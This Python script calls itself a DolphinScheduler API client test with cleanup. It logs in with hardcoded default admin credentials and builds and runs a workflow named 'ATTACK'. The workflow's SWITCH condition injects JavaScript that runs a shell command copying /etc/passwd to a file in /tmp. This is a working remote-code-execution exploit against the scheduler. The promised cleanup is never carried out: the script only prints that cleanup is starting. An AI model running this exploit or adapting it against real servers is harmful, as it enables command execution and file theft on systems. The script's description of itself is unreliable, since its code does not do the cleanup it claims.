"""
Dolphin Scheduler API client test with full cleanup flow
Uses random names and cleans up after execution to restore the environment.
"""

import requests
import json
import uuid
import time
from typing import Optional, Dict, List
from loguru import logger


def request_id(response: requests.Response) -> Optional[str]:
    return response.headers.get("X-Request-ID") or response.headers.get("X-Request-Id")


def log_response(label: str, response: requests.Response, capture: bool = True) -> None:
    responses = list(response.history) + [response]
    rid_label = "X-Request-ID" if capture else "RID"
    for index, item in enumerate(responses):
        suffix = "" if len(responses) == 1 else f" redirect[{index}]"
        req = item.request
        logger.debug(
            f"{label}{suffix} {req.method} {req.url} "
            f"Code: {item.status_code} {rid_label}: {request_id(item)}"
        )


class DolphinSchedulerClient:
    """Dolphin Scheduler API client"""

    def __init__(self, base_url: str, username: str, password: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self._login(username, password)

    def _login(self, username: str, password: str) -> None:
        url = f"{self.base_url}/login"
        params = {"userName": username, "userPassword": password}
        resp = self.session.post(url, params=params)
        resp.raise_for_status()
        result = resp.json()
        if not result.get("success", False):
            raise Exception(f"Login failed: {result.get('msg', 'unknown error')}")
        print("[OK] Login succeeded")
        log_response("POST /login", resp)

    # -------------------- Tenant operations --------------------
    def create_tenant(
        self, tenant_code: str, queue_id: int, description: Optional[str] = None,
        capture: bool = True
    ) -> Dict:
        url = f"{self.base_url}/tenants"
        params = {"tenantCode": tenant_code, "queueId": queue_id}
        if description:
            params["description"] = description
        resp = self.session.post(url, params=params)
        log_response("POST /tenants", resp, capture=capture)
        resp.raise_for_status()
        return resp.json()

    def delete_tenant(self, tenant_id: int) -> Dict:
        """Delete tenant"""
        url = f"{self.base_url}/tenants/{tenant_id}"
        resp = self.session.delete(url)
        log_response("DELETE /tenants", resp, capture=False)
        resp.raise_for_status()
        return resp.json()

    # -------------------- Project operations --------------------
    def query_project_list(self) -> List[Dict]:
        url = f"{self.base_url}/projects"
        resp = self.session.get(url, params={"pageNo": 1, "pageSize": 100})
        resp.raise_for_status()
        result = resp.json()
        if not result.get("success", False):
            raise Exception(f"Failed to query project list: {result.get('msg', 'unknown error')}")
        log_response("GET /projects", resp, capture=False)
        return result.get("data", [])

    def create_project(
        self, project_name: str, description: Optional[str] = None, capture: bool = True
    ) -> Dict:
        url = f"{self.base_url}/projects"
        params = {"projectName": project_name}
        if description:
            params["description"] = description
        resp = self.session.post(url, params=params)
        log_response("POST /projects", resp, capture=capture)
        resp.raise_for_status()
        return resp.json()

    def delete_project(self, project_code: int) -> Dict:
        """Delete project using the V2 API"""
        url = f"{self.base_url}/v2/projects/{project_code}"
        resp = self.session.delete(url)
        log_response("DELETE /v2/projects", resp, capture=False)
        resp.raise_for_status()
        return resp.json()

    # -------------------- Workflow definition operations --------------------
    def create_process_definition(
        self, project_code: int, name: str, locations: str, tenant_code: str,
        task_relation_json: str, task_definition_json: str, description: Optional[str] = None,
        timeout: Optional[int] = None, global_params: Optional[str] = None,
        execution_type: Optional[str] = None, capture: bool = True
    ) -> Dict:
        url = f"{self.base_url}/projects/{project_code}/process-definition"
        params = {
            "name": name, "locations": locations, "tenantCode": tenant_code,
            "taskRelationJson": task_relation_json, "taskDefinitionJson": task_definition_json
        }
        if description: params["description"] = description
        if timeout: params["timeout"] = timeout
        if global_params: params["globalParams"] = global_params
        if execution_type: params["executionType"] = execution_type
        resp = self.session.post(url, params=params)
        resp.raise_for_status()
        log_response("POST /process-definition", resp, capture=capture)
        return resp.json()

    def release_process_definition(
        self, project_code: int, code: int, release_state: str, capture: bool = True
    ) -> Dict:
        url = f"{self.base_url}/projects/{project_code}/process-definition/{code}/release"
        params = {"releaseState": release_state}
        resp = self.session.post(url, params=params)
        log_response("POST /process-definition/release", resp, capture=capture)
        resp.raise_for_status()
        return resp.json()

    def delete_process_definition(self, project_code: int, code: int) -> Dict:
        """Delete workflow definition"""
        url = f"{self.base_url}/projects/{project_code}/process-definition/{code}"
        resp = self.session.delete(url)
        log_response("DELETE /process-definition", resp, capture=False)
        resp.raise_for_status()
        return resp.json()

    # -------------------- Workflow run operations --------------------
    def start_process_instance(
        self, project_code: int, process_definition_code: int, failure_strategy: str,
        schedule_time: str, warning_type: str, capture: bool = True, **kwargs
    ) -> Dict:
        url = f"{self.base_url}/projects/{project_code}/executors/start-process-instance"
        params = {
            "processDefinitionCode": process_definition_code,
            "failureStrategy": failure_strategy,
            "scheduleTime": schedule_time,
            "warningType": warning_type
        }
        # Merge optional parameters
        optional_params = [
            "processInstancePriority", "workerGroup", "warningGroupId", "environmentCode",
            "startParams", "execType", "expectedParallelismNumber", "dryRun", "runMode",
            "complementDependentMode", "taskDependType", "timeout", "startNodeList"
        ]
        for key in optional_params:
            if key in kwargs and kwargs[key] is not None:
                params[key] = kwargs[key]
        resp = self.session.post(url, params=params)
        resp.raise_for_status()
        log_response("POST /executors/start-process-instance", resp, capture=capture)
        return resp.json()

    def get_process_instance_list(
        self, project_code: int, process_define_code: int, page_no: int = 1, page_size: int = 10
    ) -> List[Dict]:
        """Query workflow instance list to check run status"""
        url = f"{self.base_url}/projects/{project_code}/process-instances"
        params = {
            "processDefineCode": process_define_code,
            "pageNo": page_no,
            "pageSize": page_size
        }
        resp = self.session.get(url, params=params)
        resp.raise_for_status()
        log_response("GET /process-instances", resp, capture=False)
        result = resp.json()
        if not result.get("success", False):
            raise Exception(f"Failed to query instance list: {result.get('msg')}")
        return result.get("data", {}).get("totalList", [])


def random_suffix() -> str:
    """Generate a 6-character suffix with lowercase letters and digits"""
    return uuid.uuid4().hex[:6].lower()


if __name__ == "__main__":
    # ========== Configuration ==========
    BASE_URL = "http://localhost:12345/dolphinscheduler"
    USERNAME = "admin"
    PASSWORD = "dolphinscheduler123"
    QUEUE_ID = 1  # Default queue ID; adjust for the target environment

    # Record created resources to ensure cleanup
    created_resources = {
        "tenant_id": None,
        "project_code": None,
        "instance_id": None,
        "attack_definition_code": None
    }

    client = None
    try:
        # 1. Initialize client
        client = DolphinSchedulerClient(BASE_URL, USERNAME, PASSWORD)

        # 2. Generate random names
        suffix = random_suffix()
        tenant_code = f"test_tenant_{suffix}"
        project_name = f"test_project_{suffix}"
        print(f"[INFO] Test suffix for this run: {suffix}")

        # 3. Create tenant
        print(f"[INFO] Create tenant: {tenant_code}")
        tenant_resp = client.create_tenant(tenant_code, queue_id=QUEUE_ID, description="test tenant")
        if tenant_resp.get("success"):
            tenant_data = tenant_resp.get("data", {})
            created_resources["tenant_id"] = tenant_data.get("id")
            print(f"[OK] Tenant created successfully, ID: {created_resources['tenant_id']}")
            # logger.debug(f"Tenant created successfullyX-Request-ID: {tenant_resp.headers.get('X-Request-ID')}")
        else:
            raise Exception(f"Failed to create tenant: {tenant_resp}")

        # 4. Create project
        print(f"[INFO] Create project: {project_name}")
        project_resp = client.create_project(project_name, description="test project")
        if project_resp.get("success"):
            project_data = project_resp.get("data", {})
            created_resources["project_code"] = project_data.get("code")
            print(f"[OK] Project created successfully, Code: {created_resources['project_code']}")
            # logger.debug(f"Project created successfullyX-Request-ID: {project_resp.headers.get('X-Request-ID')}")
        else:
            raise Exception(f"Failed to create project: {project_resp}")

        project_code = created_resources["project_code"]
        
        # 5. Create ATTACK workflow: switch(aaa) -> bash(bbb)
        attack_task_codes = {
            "aaa": int(time.time() * 1000 + 100) % 1000000000,
            "bbb": int(time.time() * 1000 + 200) % 1000000000
        }

        switch_condition = (
            "var a = mainOutput(); "
            "function mainOutput() { "
            "var x=java.lang.Runtime.getRuntime().exec(\"cat /etc/passwd >> /tmp/attack.txt\")};"
        )

        attack_task_definition = [
            {
                "code": attack_task_codes["aaa"],
                "name": "aaa",
                "taskType": "SWITCH",
                "flag": "YES",
                "taskPriority": "MEDIUM",
                "taskParams": json.dumps({
                    "localParams": [],
                    "rawScript": "",
                    "resourceList": [],
                    "switchResult": {
                        "dependTaskList": [
                            {
                                "condition": switch_condition,
                                "nextNode": attack_task_codes["bbb"]
                            }
                        ],
                        "nextNode": attack_task_codes["bbb"]
                    }
                }),
                "workerGroup": "default",
                "timeoutFlag": "CLOSE"
            },
            {
                "code": attack_task_codes["bbb"],
                "name": "bbb",
                "taskType": "SHELL",
                "flag": "YES",
                "taskPriority": "MEDIUM",
                "taskParams": json.dumps({
                    "localParams": [],
                    "rawScript": "ls",
                    "resourceList": []
                }),
                "workerGroup": "default",
                "timeoutFlag": "CLOSE"
            }
        ]

        attack_task_relation = [
            {
                "preTaskCode": 0,
                "postTaskCode": attack_task_codes["aaa"],
                "name": "",
                "conditionType": "NONE"
            },
            {
                "preTaskCode": attack_task_codes["aaa"],
                "postTaskCode": attack_task_codes["bbb"],
                "name": "",
                "conditionType": "NONE"
            }
        ]

        attack_locations = json.dumps([
            {"taskCode": attack_task_codes["aaa"], "x": 100, "y": 100},
            {"taskCode": attack_task_codes["bbb"], "x": 400, "y": 400}
        ])

        attack_workflow_name = f"attack_{suffix}"
        print(f"[INFO] Create ATTACK workflow: {attack_workflow_name}")
        attack_definition_resp = client.create_process_definition(
            project_code=project_code,
            name=attack_workflow_name,
            locations=attack_locations,
            tenant_code=tenant_code,
            task_relation_json=json.dumps(attack_task_relation),
            task_definition_json=json.dumps(attack_task_definition),
            description="ATTACK workflow"
        )
        if attack_definition_resp.get("success"):
            attack_definition_data = attack_definition_resp.get("data", {})
            created_resources["attack_definition_code"] = attack_definition_data.get("code")
            print(f"[OK] ATTACK workflow created successfully, Code: {created_resources['attack_definition_code']}")
            # logger.debug(f"ATTACK workflow definition createdX-Request-ID: {attack_definition_resp.headers.get('X-Request-ID')}")
        else:
            raise Exception(f"Failed to create ATTACK workflow: {attack_definition_resp}")

        # Release ATTACK workflow
        print("[INFO] Release ATTACK workflow")
        attack_release_resp = client.release_process_definition(
            project_code, created_resources["attack_definition_code"], "ONLINE"
        )
        if not attack_release_resp.get("success"):
            raise Exception(f"ATTACK workflowRelease failed: {attack_release_resp}")
        print("[OK] ATTACK workflow released")
        # logger.debug(f"ATTACK workflow definition releasedX-Request-ID: {attack_release_resp.headers.get('X-Request-ID')}")

        # 6. Start ATTACK workflow instance
        print("[INFO] Start ATTACK workflow instance")
        attack_run_resp = client.start_process_instance(
            project_code=project_code,
            process_definition_code=created_resources["attack_definition_code"],
            failure_strategy="CONTINUE",
            schedule_time="",  # Run immediately
           warning_type="NONE"
        )
        print(f"Start response: {attack_run_resp}")
        # logger.debug(f"ATTACK workflow startedX-Request-ID: {attack_run_resp.headers.get('X-Request-ID')}")

        # 8. Wait for workflow execution to complete, up to 30 seconds
        print("Waiting for workflow execution to complete...")
        time.sleep(5)  # Wait for initial execution

        print("\nTest execution finished; starting resource cleanup...")

    except Exception as e:
        print(f"\n[ERROR] Exception occurred during test execution: {e}")
